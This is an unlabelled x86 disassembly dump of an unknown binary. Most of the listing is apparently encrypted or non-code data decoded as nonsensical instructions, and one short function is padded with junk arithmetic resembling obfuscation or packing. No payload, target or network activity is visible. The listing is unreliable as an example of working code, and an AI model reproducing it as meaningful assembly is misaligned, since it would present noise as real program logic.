  421ad8:	add    bh,BYTE PTR [ebx-0x11a8a5cd]
  421ade:	add    BYTE PTR [ebp-0x7b4afb0b],bl
  421ae4:	push   eax
  421ae5:	add    edi,DWORD PTR [edx]
  421ae7:	test   al,0x55
  421ae9:	stos   BYTE PTR es:[edi],al
  421aea:	inc    edx
  421aeb:	sub    al,0xab
  421aed:	stos   BYTE PTR es:[edi],al
  421aee:	leave  
  421aef:	fldenv [edx+0x3]
  421af2:	push   ecx
  421af3:	test   BYTE PTR ds:0x21b34796,cl
  421af9:	xor    BYTE PTR [edi+0x7d1dccbb],bl
  421aff:	test   BYTE PTR [ebp+eax*4+0x2de0077b],dl
  421b06:	and    BYTE PTR [eax],dh
  421b08:	jo     0x421ae7
  421b0a:	add    cl,bl
  421b0c:	jl     0x421ae0
  421b0e:	mov    edi,0xb68f1875
  421b13:	fs dec ebp
  421b15:	dec    edi
  421b16:	cmp    edi,DWORD PTR [edi+ebx*1-0x4c]
  421b1a:	or     al,0x2d
  421b1c:	test   eax,0x8e85dd4
  421b21:	iret   
  421b22:	sar    DWORD PTR [ecx+0x7db8fcef],0x4e
  421b29:	xchg   esi,eax
  421b2a:	aas    
  421b2b:	fcom   QWORD PTR [ecx]
  421b2d:	psubw  mm5,mm5
  421b30:	lea    ebp,[edx+0x19]
  421b33:	loop   0x421b33
  421b35:	pop    esp
  421b36:	ror    cl,0x78
  421b39:	xchg   eax,eax
  421b3b:	jp     0x421bae
  421b3d:	imul   esi,DWORD PTR [edi+0x3f],0xffffff82
  421b41:	cmp    eax,DWORD PTR [eax+0x72]
  421b44:	mov    edx,0x6f4eb0c6
  421b49:	adc    esi,0xc2e5dca5
  421b4f:	mov    edx,0x6b6b0843
  421b54:	aad    0xdc
  421b56:	mov    BYTE PTR [ecx+0xe],bh
  421b59:	adc    ebp,eax
  421b5b:	cmp    al,0x38
  421b5d:	lods   eax,DWORD PTR ds:[esi]
  421b5e:	push   es
  421b5f:	repz setb BYTE PTR [ebx+0x2245f8c0]
  421b67:	in     eax,0xf
  421b69:	mov    BYTE PTR [ebx],dh
  421b6b:	imul   edi,DWORD PTR [edx+ebp*8-0x569e05ed],0xd1d505c2
  421b76:	retf   
  421b77:	inc    ebx
  421b78:	mov    ds:0xb36031b,eax
  421b7d:	fistp  DWORD PTR [edx+ecx*2+0x2f]
  421b81:	outs   dx,DWORD PTR ds:[esi]
  421b82:	out    0xdc,al
  421b84:	mov    ch,0x69
  421b86:	mov    dh,0xd1
  421b88:	(bad)  
  421b89:	stc    
  421b8a:	adc    al,0x8d
  421b8c:	jno    0x421b9d
  421b8e:	dec    esp
  421b8f:	ins    DWORD PTR es:[edi],dx
  421b90:	mov    sp,0xd0df
  421b94:	sbb    bl,BYTE PTR [edx]
  421b96:	ret    
  421b97:	inc    ecx
  421b98:	pop    eax
  421b99:	mov    es,WORD PTR [ebp-0xb057bb0]
  421b9f:	inc    eax
  421ba0:	push   esp
  421ba1:	mov    bl,BYTE PTR [eax+edi*2-0x47dd7e66]
  421ba8:	xor    ebx,DWORD PTR ds:[esi+0x4094798e]
  421baf:	push   ds
  421bb0:	xchg   DWORD PTR [ebx+0x49],edx
  421bb3:	cmp    esp,DWORD PTR [esi]
  421bb5:	fisttp QWORD PTR [ebx+ebp*1+0x7f365b1f]
  421bbc:	ret    0x718b
  421bbf:	mov    ecx,0x7738e5
  421bc4:	fstp   TBYTE PTR [esi]
  421bc6:	mov    eax,0x11aceb9
  421bcb:	xchg   edi,eax
  421bcc:	mov    esp,0x909efd06
  421bd1:	xor    al,0xac
  421bd3:	repz fisubr WORD PTR ds:0xb4a7317e
  421bda:	shl    BYTE PTR [ecx+0x48],0x7e
  421bde:	retf   
  421bdf:	repz daa 
  421be1:	ins    BYTE PTR es:[edi],dx
  421be2:	bound  eax,QWORD PTR [esi+0x3]
  421be5:	nop
  421be6:	pop    edi
  421be7:	and    DWORD PTR [esi],esi
  421be9:	addr16 or eax,0x1e70bc73
  421bef:	into   
  421bf0:	fld    st(3)
  421bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bf3:	inc    esp
  421bf4:	adc    DWORD PTR [edx-0x48],0x357278b8
  421bfb:	stos   BYTE PTR es:[edi],al
  421bfc:	jp     0x421bf9
  421bfe:	test   al,0x9d
  421c00:	jmp    0x421c3f
  421c02:	icebp  
  421c03:	jle    0x421c54
  421c05:	mov    eax,ds:0xcfe9f544
  421c0a:	out    dx,eax
  421c0b:	jg     0x421be4
  421c0d:	ror    BYTE PTR [esp+edi*2-0x447c66f7],0x61
  421c15:	ds scas al,BYTE PTR es:[edi]
  421c17:	xchg   BYTE PTR [esi],cl
  421c19:	(bad)  
  421c1a:	enter  0x40d1,0x33
  421c1e:	sbb    edi,eax
  421c20:	lods   eax,DWORD PTR ds:[esi]
  421c21:	into   
  421c22:	test   al,0x5e
  421c24:	sar    DWORD PTR [eax+ebx*2-0x4917f2f0],0x79
  421c2c:	cdq    
  421c2d:	xlat   BYTE PTR ds:[ebx]
  421c2e:	mov    ebx,0x9ffd0a15
  421c33:	scas   eax,DWORD PTR es:[edi]
  421c34:	cwde   
  421c35:	dec    edi
  421c37:	test   dl,dl
  421c39:	adc    DWORD PTR [esi+0x32],esi
  421c3c:	mov    esp,0x3ac2bdb4
  421c41:	pop    esi
  421c42:	cmp    eax,0x8a94b41
  421c47:	arpl   WORD PTR [esi-0x7ce45a38],bx
  421c4d:	pop    edx
  421c4e:	ret    0x2b06
  421c51:	aas    
  421c52:	sbb    bh,BYTE PTR [edx-0x44]
  421c55:	in     al,0x67
  421c57:	rol    BYTE PTR [ebp-0x43435637],0xb1
  421c5e:	sub    ebx,edx
  421c60:	mov    edi,0x35266ee0
  421c65:	rcr    BYTE PTR [edi+0x1e],cl
  421c68:	cmp    eax,0xf45c21f0
  421c6d:	test   BYTE PTR [ebx],al
  421c6f:	call   0x563d24d6
  421c74:	ins    BYTE PTR es:[edi],dx
  421c75:	lods   al,BYTE PTR ds:[esi]
  421c76:	mov    al,ds:0x81c968fc
  421c7b:	shl    BYTE PTR [ebp-0x428d155b],cl
  421c81:	cmp    eax,0xa01a44e1
  421c86:	aad    0x7c
  421c88:	mov    ecx,0xaadbb3b1
  421c8d:	test   BYTE PTR [ebx+edx*2],0xed
  421c91:	mov    esi,0x44cf3b47
  421c96:	xor    ah,ch
  421c98:	pop    ebx
  421c99:	dec    ecx
  421c9a:	pop    ss
  421c9b:	call   0x135c:0xaee0ecac
  421ca2:	and    DWORD PTR [ecx],ebp
  421ca4:	xor    bl,cl
  421ca6:	imul   ecx,DWORD PTR [esp+edi*4],0x55e0a42e
  421cad:	pop    ds
  421cae:	lea    ebx,[esi-0x18c41c1e]
  421cb4:	xor    edi,DWORD PTR [esi-0x3a]
  421cb7:	test   DWORD PTR [bp+si+0xa67],ebx
  421cbc:	out    dx,eax
  421cbd:	push   edi
  421cbe:	mov    ah,BYTE PTR [ecx*1-0x11b28d73]
  421cc5:	inc    edi
  421cc6:	mov    edx,0xa691db8f
  421ccb:	int    0x78
  421ccd:	loope  0x421c77
  421ccf:	aaa    
  421cd0:	out    0xb9,eax
  421cd2:	mov    WORD PTR [edx+edx*8-0x4557569e],cs
  421cd9:	pop    es
  421cda:	dec    eax
  421cdb:	dec    eax
  421cdc:	mov    bh,0x45
  421cde:	sbb    BYTE PTR [ebx+0xf],0xfa
  421ce2:	fsubr  DWORD PTR [eax-0x6]
  421ce5:	sub    eax,0x5d53a94c
  421cea:	inc    esi
  421ceb:	dec    esp
  421cec:	push   ecx
  421ced:	in     eax,dx
  421cee:	xor    al,0x4b
  421cf0:	int    0x5e
  421cf2:	mov    esi,0x7c0fe962
  421cf7:	repnz sar dl,1
  421cfa:	mov    al,ds:0x823a4925
  421cff:	inc    esp
  421d00:	sbb    bh,BYTE PTR [ecx]
  421d02:	push   edx
  421d03:	lea    ebp,[esi]
  421d05:	mov    ch,0x25
  421d07:	or     eax,0x7fd1f40d
  421d0c:	fst    QWORD PTR [eax]
  421d0e:	jmp    0x421d72
  421d10:	xchg   ebp,eax
  421d11:	adc    DWORD PTR [ebp-0x2f85b05],esp
  421d17:	shr    eax,cl
  421d19:	cmc    
  421d1a:	sbb    BYTE PTR [ebx+0x4753b4f2],cl
  421d20:	sbb    ebx,DWORD PTR [edi+esi*2-0x6f]
  421d24:	pop    edi
  421d25:	aas    
  421d26:	sub    BYTE PTR [esi-0x23],bl
  421d29:	pop    eax
  421d2a:	or     eax,0x2273e1bf
  421d2f:	add    dl,BYTE PTR [ebp-0x30]
  421d32:	jnp    0x421cd4
  421d34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d35:	mov    ah,0x24
  421d37:	mov    ds:0xd4829d74,eax
  421d3c:	ins    DWORD PTR es:[edi],dx
  421d3d:	dec    ecx
  421d3e:	jb     0x421d35
  421d40:	cs in  eax,0xd
  421d43:	xchg   ecx,eax
  421d44:	test   eax,0xc039f891
  421d49:	adc    DWORD PTR [ecx-0x6428206],0xd36dba88
  421d53:	(bad)  [ebx+0x3c55e386]
  421d59:	pcmpeqd mm1,QWORD PTR [ecx-0x1684f6d8]
  421d60:	push   es
  421d61:	sbb    al,0xf9
  421d63:	lods   al,BYTE PTR ds:[esi]
  421d64:	xor    ebp,ebp
  421d66:	adc    DWORD PTR [esi-0x353608f],eax
  421d6c:	retf   
  421d6d:	add    BYTE PTR [edx+0x2a],bl
  421d70:	outs   dx,DWORD PTR ds:[esi]
  421d71:	fistp  WORD PTR [ebx-0xd891f85]
  421d77:	push   ecx
  421d78:	mov    edi,0xa3fd303f
  421d7d:	push   0x48
  421d7f:	inc    esi
  421d80:	push   0xeed34f17
  421d85:	pop    eax
  421d86:	pop    edx
  421d87:	jo     0x421db6
  421d89:	xlat   BYTE PTR ds:[ebx]
  421d8a:	scas   al,BYTE PTR es:[edi]
  421d8b:	stos   DWORD PTR es:[edi],eax
  421d8c:	clc    
  421d8d:	mov    ebp,DWORD PTR [eax-0x45]
  421d90:	(bad)  
  421d91:	loope  0x421d6f
  421d93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d94:	int3   
  421d95:	bound  ebx,QWORD PTR [esi+0x5df7745e]
  421d9b:	stos   BYTE PTR es:[edi],al
  421d9c:	adc    BYTE PTR [eax+ebp*8-0x6f3e7a1a],dl
  421da3:	xchg   edi,eax
  421da4:	mov    eax,0xeaae74be
  421da9:	sar    BYTE PTR [eax-0x7d5de058],1
  421daf:	push   ecx
  421db0:	inc    ebx
  421db1:	(bad)  
  421db2:	push   ebp
  421db3:	ss sbb eax,0x48208afd
  421db9:	out    0x7d,eax
  421dbb:	repnz cdq 
  421dbd:	mov    al,ds:0x9281667d
  421dc2:	dec    ebp
  421dc3:	aas    
  421dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dc5:	and    al,0xcb
  421dc7:	jb     0x421da2
  421dc9:	add    bl,BYTE PTR [edi-0x2e]
  421dcc:	or     ch,ch
  421dce:	aas    
  421dcf:	xchg   BYTE PTR [ecx+0x78],cl
  421dd2:	outs   dx,BYTE PTR ds:[esi]
  421dd3:	retf   0x55cb
  421dd6:	xchg   ecx,eax
  421dd7:	xchg   DWORD PTR ss:[ebx+0x79],ebp
  421ddb:	pop    ss
  421ddc:	jmp    0x127c:0x24e59af5
  421de3:	push   eax
  421de4:	fsubr  DWORD PTR [ebp-0x7a0d3bcc]
  421dea:	sbb    DWORD PTR [eax],0x5d78c6dc
  421df0:	fidiv  DWORD PTR [eax-0x716b5ba3]
  421df6:	xchg   ebx,eax
  421df7:	test   al,0x5b
  421df9:	jne    0x421e45
  421dfb:	add    eax,0x535b7b7a
  421e00:	dec    eax
  421e01:	stc    
  421e02:	dec    edi
  421e03:	aas    
  421e04:	call   0x64b18a82
  421e09:	setns  BYTE PTR [edi-0x63]
  421e0d:	pop    ss
  421e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e0f:	lahf   
  421e10:	mov    ds:0x305c37ab,eax
  421e15:	mov    dl,0xb8
  421e17:	xor    eax,DWORD PTR [ebx]
  421e19:	fst    DWORD PTR [ecx-0x28]
  421e1c:	inc    ecx
  421e1d:	pop    esp
  421e1e:	adc    bl,0xa7
  421e21:	das    
  421e22:	adc    al,0x77
  421e24:	sbb    eax,0xdb6dc0f3
  421e29:	xor    esi,0xb3efb183
  421e2f:	pop    esi
  421e30:	fwait
  421e31:	push   ss
  421e32:	(bad)  
  421e33:	cs hlt 
  421e35:	push   ebp
  421e36:	inc    edi
  421e37:	jmp    0x421e0f
  421e39:	leave  
  421e3a:	les    ecx,FWORD PTR [ebp+0x76]
  421e3d:	jmp    0x421ea4
  421e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e40:	sbb    DWORD PTR [edx],ebx
  421e42:	mov    esp,0xae8d420d
  421e47:	inc    eax
  421e48:	paddb  mm2,QWORD PTR fs:[esi-0x3e2349d]
  421e50:	push   ss
  421e51:	sub    eax,0xc86c52ea
  421e56:	mov    esp,edx
  421e58:	sub    edi,DWORD PTR [edx]
  421e5a:	lahf   
  421e5b:	mov    ebx,0xa3b6654b
  421e60:	(bad)  
  421e61:	jbe    0xf8b4bcde
  421e67:	pop    ebx
  421e68:	cmp    BYTE PTR [ebx+0x22c0ed3b],ch
  421e6e:	inc    edi
  421e6f:	cdq    
  421e70:	gs in  al,0xd5
  421e73:	ins    BYTE PTR es:[edi],dx
  421e74:	ss sub eax,0xbe37608c
  421e7a:	int3   
  421e7b:	mov    bl,0x24
  421e7d:	test   BYTE PTR [ecx-0x57],dl
  421e80:	cmc    
  421e81:	mov    ds:0x57918f43,al
  421e86:	in     al,0x4b
  421e88:	jg     0x421eec
  421e8a:	sub    eax,0x5ae4d8b7
  421e8f:	jp     0x421e7b
  421e91:	popf   
  421e92:	or     ecx,DWORD PTR [ecx+0x20]
  421e95:	call   0xf8f8cc7e
  421e9a:	test   DWORD PTR [ecx],edi
  421e9c:	mov    esp,0xad3337ce
  421ea1:	dec    edx
  421ea2:	sub    dl,BYTE PTR [esi+esi*1]
  421ea5:	inc    eax
  421ea6:	lods   al,BYTE PTR ds:[esi]
  421ea7:	nop
  421ea8:	adc    al,0x95
  421eaa:	pop    ecx
  421eab:	in     eax,0x5b
  421ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421eae:	in     eax,dx
  421eaf:	adc    dl,BYTE PTR [esi+0x44f9a1fd]
  421eb5:	rcl    BYTE PTR fs:[edi],0x38
  421eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421eba:	or     BYTE PTR [esi-0x41],bl
  421ebd:	pop    edx
  421ebe:	int3   
  421ebf:	adc    eax,0x9e66a937
  421ec4:	test   eax,0x3d7bdcba
  421ec9:	adc    eax,0x2f0bcedd
  421ece:	pop    ebp
  421ecf:	push   0x946d3b39
  421ed4:	add    al,0xa1
  421ed6:	dec    edx
  421ed7:	rcr    ebp,0xe6
  421eda:	mov    esi,0xa6deb863
  421edf:	enter  0x9d45,0x5
  421ee3:	xor    al,0x56
  421ee5:	outs   dx,BYTE PTR ds:[esi]
  421ee6:	fs mov al,0x62
  421ee9:	(bad)  [ecx+ecx*1-0x63]
  421eed:	cmc    
  421eee:	and    eax,0x82670524
  421ef3:	js     0x421e9c
  421ef5:	retf   
  421ef6:	push   edx
  421ef7:	stos   BYTE PTR es:[edi],al
  421ef8:	cmp    eax,0x2c8c11e2
  421efd:	or     al,0x71
  421eff:	mov    ds:0x40253a6c,eax
  421f04:	mov    eax,DWORD PTR [eax-0x2e]
  421f07:	cmp    al,0x6
  421f09:	inc    ebp
  421f0a:	inc    esi
  421f0b:	mov    bl,0xd7
  421f0d:	inc    esi
  421f0e:	scas   eax,DWORD PTR es:[edi]
  421f0f:	xor    eax,0x4d55899e
  421f14:	xchg   BYTE PTR [eax+0x6695d68f],bl
  421f1a:	sbb    edx,esp
  421f1c:	out    dx,eax
  421f1d:	mov    es,edx
  421f1f:	inc    edi
  421f20:	inc    edx
  421f21:	and    DWORD PTR [edx+eiz*2],ebx
  421f24:	gs inc esi
  421f26:	das    
  421f27:	dec    esp
  421f28:	sahf   
  421f29:	push   cs
  421f2a:	jae    0x421f90
  421f2c:	std    
  421f2d:	xchg   esp,eax
  421f2e:	lock sar BYTE PTR [ebp+eax*4-0xd],cl
  421f33:	jmp    0xd0fed27f
  421f38:	push   ss
  421f39:	mov    ds:0xcb788775,eax
  421f3e:	cld    
  421f3f:	jnp    0x421f11
  421f41:	shl    cl,cl
  421f43:	xor    DWORD PTR [eax-0x1eacdc24],ebp
  421f49:	mov    bl,0x8e
  421f4b:	inc    esp
  421f4c:	jno    0x421f21
  421f4e:	call   0xf8da:0x9bc97991
  421f55:	mov    al,ds:0xee272336
  421f5a:	cmc    
  421f5b:	push   edi
  421f5c:	and    DWORD PTR [esi-0x35cd999a],edi
  421f62:	and    edx,ebp
  421f64:	or     BYTE PTR [eax+0x34e0a946],ah
  421f6a:	xor    ecx,eax
  421f6c:	add    ecx,esi
  421f6e:	jne    0x41d82d
  421f74:	mov    ecx,DWORD PTR [ebp-0x8]
  421f77:	xor    ecx,eax
  421f79:	mov    eax,DWORD PTR [ebp+0x10]
  421f7c:	add    ecx,esi
  421f7e:	mov    DWORD PTR [eax],ecx
  421f80:	pop    edi
  421f81:	pop    esi
  421f82:	pop    ebx
  421f83:	leave  
  421f84:	ret    0xc
  421f87:	push   ebp
  421f88:	mov    ebp,esp
  421f8a:	sub    esp,0x7c
  421f8d:	push   esi
  421f8e:	sbb    esi,esi
  421f90:	push   edi
  421f91:	mov    eax,ds:0x42f36b
  421f96:	adc    esi,esi
  421f98:	mov    DWORD PTR [ebp-0x24],eax
  421f9b:	and    eax,DWORD PTR ds:0x42b008
  421fa1:	mov    eax,ds:0x42f477
  421fa6:	adc    edi,0x31bd
  421fac:	mov    DWORD PTR [ebp-0x34],eax
  421faf:	mov    eax,ds:0x424ad9
  421fb4:	mov    esi,DWORD PTR ds:0x424b74
  421fba:	sub    eax,esi
  421fbc:	or     eax,DWORD PTR [eax+esi*1]
  421fbf:	and    DWORD PTR [ebp-0x30],0x0
  421fc3:	sub    esi,DWORD PTR ds:0x42d014
  421fc9:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  421fd0:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  421fd7:	mov    eax,DWORD PTR [ebp-0x10]
  421fda:	mov    ecx,DWORD PTR [ebp-0x10]
  421fdd:	not    edi
  421fdf:	sub    eax,ecx
  421fe1:	mov    esi,DWORD PTR ds:0x429020
  421fe7:	xor    DWORD PTR ds:0x42a018,esi
  421fed:	mov    DWORD PTR [ebp-0x10],eax
  421ff0:	inc    DWORD PTR ds:0x42900c
  421ff6:	xor    DWORD PTR [ebp-0x10],0xf89cb5b0
  421ffd:	xor    edi,edi
  421fff:	xor    edi,DWORD PTR ds:0x42e004
  422005:	mov    edi,DWORD PTR [edi]
  422007:	sub    DWORD PTR ds:0x42901c,edi
  42200d:	mov    eax,DWORD PTR [ebp-0x18]
  422010:	mov    DWORD PTR ds:0x429028,0x1d
  42201a:	cmp    DWORD PTR ds:0x429028,0x0
  422021:	je     0x422077
  422027:	cmp    DWORD PTR ds:0x429028,0x4
  42202e:	jbe    0x422077
  422034:	jmp    0x422049
  422039:	push   0x1746
  42203e:	push   0x4baa
  422043:	call   DWORD PTR ds:0x430027
  422049:	cmp    DWORD PTR ds:0x429028,0x5
  422050:	jne    0x422063
  422056:	mov    esi,DWORD PTR ds:0x429028
  42205c:	dec    esi
  42205d:	mov    DWORD PTR ds:0x429028,esi
  422063:	xor    esi,esi
  422065:	add    esi,DWORD PTR ds:0x429028
  42206b:	dec    esi
  42206c:	mov    DWORD PTR ds:0x429028,esi
  422072:	jmp    0x42201a
  422077:	mov    ecx,DWORD PTR [ebp-0x18]
  42207a:	sub    eax,ecx
  42207c:	mov    DWORD PTR [ebp-0x18],eax
  42207f:	sub    edi,DWORD PTR ds:0x42d018
  422085:	or     DWORD PTR [ebp-0x18],0xf89f05b0
  42208c:	mov    eax,DWORD PTR [ebp-0xc]
  42208f:	mov    ecx,DWORD PTR [ebp-0xc]
  422092:	or     esi,0x5a7b
  422098:	sub    eax,ecx
  42209a:	mov    DWORD PTR [ebp-0xc],eax
  42209d:	jmp    0x422f4a
  4220a2:	lea    esp,[ebx-0x440791fa]
  4220a8:	test   DWORD PTR [ebx-0x537f27ca],eax
  4220ae:	enter  0x8b5e,0x5e
  4220b2:	stc    
  4220b3:	mov    BYTE PTR [ebp+0x7a],bh
  4220b6:	jmp    0xe034:0xa37a7a68
  4220bd:	ins    BYTE PTR es:[edi],dx
  4220be:	and    eax,0xae9c97e1
  4220c3:	les    edi,FWORD PTR [edi+0x431f6794]
  4220c9:	cmp    al,dl
  4220cb:	idiv   DWORD PTR [ecx]
  4220cd:	xchg   ecx,eax
  4220ce:	jl     0x4220ec
  4220d0:	lods   al,BYTE PTR ds:[esi]
  4220d1:	cmp    eax,0xb2b5e296
  4220d6:	cdq    
  4220d7:	je     0x422095
  4220d9:	jl     0x4220bf
  4220db:	ins    DWORD PTR es:[edi],dx
  4220dc:	and    dh,0xf0
  4220df:	mov    ah,0x45
  4220e1:	popa   
  4220e2:	xor    eax,0x9bdd8f
  4220e7:	xor    BYTE PTR [eax+0x6a],0x7a
  4220eb:	pop    edx
  4220ec:	mov    esi,0x73fe0256
  4220f1:	jp     0x42212c
  4220f3:	and    al,0xd3
  4220f5:	loop   0x4220f3
  4220f7:	fdiv   QWORD PTR [esi-0x5bc49e60]
  4220fd:	adc    eax,0x39b8ab4a
  422102:	adc    BYTE PTR [ebx],al
  422104:	sub    ah,BYTE PTR [esp+ebx*4-0x5d]
  422108:	(bad)  
  422109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42210a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42210b:	cmp    BYTE PTR [esi],bh
  42210d:	inc    ebp
  42210e:	xor    esp,DWORD PTR [esp+edi*2+0x77]
  422112:	add    bh,dh
  422114:	pop    DWORD PTR [ebp-0x35]
  422117:	cmp    edi,DWORD PTR [eax]
  422119:	sbb    cl,bh
  42211b:	push   eax
  42211c:	rcl    DWORD PTR [ecx],0xd9
  42211f:	iret   
  422120:	cwde   
  422121:	cwde   
  422122:	adc    esp,DWORD PTR [ebp+0x5f77043b]
  422128:	popf   
  422129:	xchg   ecx,eax
  42212a:	div    DWORD PTR [ebx+eiz*1]
  42212d:	push   es
  42212e:	cld    
  42212f:	fstp   DWORD PTR [ebx-0xd]
  422132:	rol    DWORD PTR [ecx+0x149dc3f0],cl
  422138:	xchg   ebp,eax
  422139:	pop    ss
  42213a:	loope  0x4220cd
  42213c:	fwait
  42213d:	cmp    DWORD PTR [esi-0x22],edi
  422140:	sub    DWORD PTR [ebx],ebx
  422142:	add    eax,0xa3b4e787
  422147:	mov    ds:0x5ffeeaf7,al
  42214c:	ja     0x42217a
  42214e:	xchg   DWORD PTR [edi],eax
  422150:	pop    es
  422151:	xchg   edx,eax
  422152:	pop    esi
  422153:	ficomp DWORD PTR [esi-0x56]
  422156:	pop    edx
  422157:	dec    ecx
  422158:	push   edx
  422159:	cli    
  42215a:	mov    dh,0xb6
  42215c:	mov    bh,0x3f
  42215e:	inc    edx
  42215f:	or     esp,edi
  422161:	sbb    eax,0x5fe83218
  422166:	cli    
  422167:	jle    0x422110
  422169:	cli    
  42216a:	push   edx
  42216b:	mov    ebp,0xc317fd2f
  422170:	jo     0x422160
  422172:	sbb    ebx,DWORD PTR [ebp-0x64829491]
  422178:	in     eax,0xba
  42217a:	mov    edx,0x9a4abfb8
  42217f:	mov    ss,esi
  422181:	in     eax,dx
  422182:	retf   
  422183:	stc    
  422184:	or     edx,DWORD PTR [ebx]
  422186:	jg     0x4221cd
  422188:	sar    al,cl
  42218a:	push   eax
  42218b:	aam    0x7
  42218d:	jle    0x4221d5
  42218f:	jae    0x422196
  422191:	enter  0xd8b7,0x48
  422195:	outs   dx,BYTE PTR ds:[esi]
  422196:	jns    0x422140
  422198:	repz sub al,0x1a
  42219b:	repz xchg esi,eax
  42219d:	mov    edx,0x4e6c93a9
  4221a2:	add    al,0x46
  4221a4:	call   0x1e78:0x1c7ff59d
  4221ab:	je     0x42216e
  4221ad:	loope  0x42213e
  4221af:	std    
  4221b0:	and    eax,0xd17fc828
  4221b5:	test   BYTE PTR [eax],0x74
  4221b8:	cmp    eax,edx
  4221ba:	ror    BYTE PTR [edx+0x48],1
  4221bd:	test   BYTE PTR [edx+0x3e],ah
  4221c0:	(bad)  [ebp-0x7d]
  4221c3:	sbb    DWORD PTR [ebp+ebx*4-0x57],edx
  4221c7:	lock mov esi,0xd8b7f3cf
  4221cd:	jge    0x4221a4
  4221cf:	or     eax,0x8f546f3
  4221d4:	nop
  4221d5:	(bad)  
  4221d6:	jmp    0x225:0xb985e5c
  4221dd:	ins    BYTE PTR es:[edi],dx
  4221de:	xor    DWORD PTR [ebp+0x1b50bb25],edx
  4221e4:	cli    
  4221e5:	xchg   esi,eax
  4221e6:	lahf   
  4221e7:	dec    edi
  4221e8:	aad    0x93
  4221ea:	mov    ds:0x704f93d7,al
  4221ef:	repnz (bad) 
  4221f1:	mov    cl,0x61
  4221f3:	jo     0x4221d5
  4221f5:	out    0x9c,al
  4221f7:	pop    edx
  4221f8:	mov    bh,0x77
  4221fa:	mov    edx,0x7e56bf4a
  4221ff:	pop    edx
  422200:	retf   0x6807
  422203:	sbb    cl,BYTE PTR [edx+0x43040a8b]
  422209:	call   FWORD PTR [edi]
  42220b:	push   edi
  42220c:	out    dx,eax
  42220d:	nop
  42220e:	sbb    eax,0x8bf609f2
  422213:	inc    ecx
  422214:	mov    cl,0xcf
  422216:	retf   
  422217:	add    DWORD PTR [ebx+0x65],ebp
  42221a:	adc    al,0x1d
  42221c:	rep outs dx,DWORD PTR ds:[esi]
  42221e:	or     al,0x93
  422220:	js     0x422255
  422222:	add    eax,0x2daeda1a
  422227:	mov    dl,0x8b
  422229:	jns    0x4222a9
  42222b:	outs   dx,BYTE PTR ds:[esi]
  42222c:	xchg   edi,eax
  42222d:	xor    eax,0x198c33f3
  422232:	cli    
  422233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422234:	clc    
  422235:	sbb    edi,esp
  422237:	clc    
  422238:	aaa    
  422239:	test   al,0xb2
  42223b:	mov    dh,0x1f
  42223d:	iret   
  42223e:	push   es
  42223f:	mov    WORD PTR [ebx+0x662ffa93],?
  422245:	outs   dx,BYTE PTR ds:[esi]
  422246:	fnsave [eax+0x16e0d87f]
  42224c:	fist   DWORD PTR [ebx+0x76fa2109]
  422252:	pushf  
  422253:	push   ss
  422254:	jecxz  0x422200
  422256:	lds    edx,FWORD PTR [edi-0x9]
  422259:	pushf  
  42225a:	push   edi
  42225b:	ret    0xaf96
  42225e:	aad    0x35
  422260:	ja     0x4222d7
  422262:	adc    DWORD PTR ss:[esi],ebp
  422265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422266:	jg     0x4222b2
  422268:	je     0x4222bf
  42226a:	mov    al,ds:0xb589f03d
  42226f:	aas    
  422270:	retf   
  422271:	cmp    al,0x41
  422273:	push   ss
  422274:	dec    ebp
  422275:	sbb    eax,0x80fc2e35
  42227a:	or     dh,BYTE PTR [edi]
  42227c:	fstp   st(3)
  42227e:	xchg   edi,eax
  42227f:	adc    al,ch
  422281:	or     dl,BYTE PTR [ecx+0x62]
  422284:	aas    
  422285:	imul   edi,DWORD PTR [ebp-0x4a],0xb73e1093
  42228c:	ss pop ebx
  42228e:	mov    al,ds:0x6e415deb
  422293:	scas   eax,DWORD PTR es:[edi]
  422294:	(bad)  [ecx+0x6b]
  422297:	call   0x4c90212c
  42229c:	and    BYTE PTR [ebx],al
  42229e:	or     ecx,DWORD PTR [ebx]
  4222a0:	adc    ecx,edi
  4222a2:	fild   WORD PTR [ebp+esi*8-0x38]
  4222a6:	test   BYTE PTR [ebx-0x25d618b9],bh
  4222ac:	mov    esp,0x7fd9e864
  4222b1:	mov    BYTE PTR [edi+0x1a],bl
  4222b4:	jno    0x42226a
  4222b6:	cmp    edi,DWORD PTR [esi-0x5785d217]
  4222bc:	sahf   
  4222bd:	push   edx
  4222be:	sub    cl,BYTE PTR [esi+0x50]
  4222c1:	stos   DWORD PTR es:[edi],eax
  4222c2:	push   esi
  4222c3:	aam    0x37
  4222c5:	or     DWORD PTR [esi],esi
  4222c7:	or     eax,0x788149be
  4222cc:	adc    al,bh
  4222ce:	cmp    BYTE PTR [eax+edx*4-0x3e],bh
  4222d2:	sbb    edi,DWORD PTR [eax+eiz*8-0x6f53f4ff]
  4222d9:	jp     0x422286
  4222db:	shr    cl,1
  4222dd:	aaa    
  4222de:	push   edi
  4222df:	ja     0x4222e5
  4222e1:	pop    es
  4222e2:	addr16 mov eax,0x898971ff
  4222e8:	into   
  4222e9:	cmp    eax,DWORD PTR [ebp+esi*8-0x1a]
  4222ed:	inc    esi
  4222ee:	dec    ebp
  4222ef:	scas   al,BYTE PTR es:[edi]
  4222f0:	lock mov cs,WORD PTR [edx+0x733ffdd8]
  4222f7:	aaa    
  4222f8:	jl     0x422333
  4222fa:	and    eax,0xd6c07ae3
  4222ff:	cs jnp 0x422297
  422302:	fwait
  422303:	(bad)  
  422304:	cwde   
  422305:	aaa    
  422306:	mov    ebp,0x5759f076
  42230b:	es loop 0x422314
  42230e:	pop    ss
  42230f:	aaa    
  422310:	cwde   
  422311:	div    ebx
  422313:	dec    esi
  422314:	mov    dl,0xc4
  422316:	cmp    al,0x4e
  422318:	xor    al,0x4d
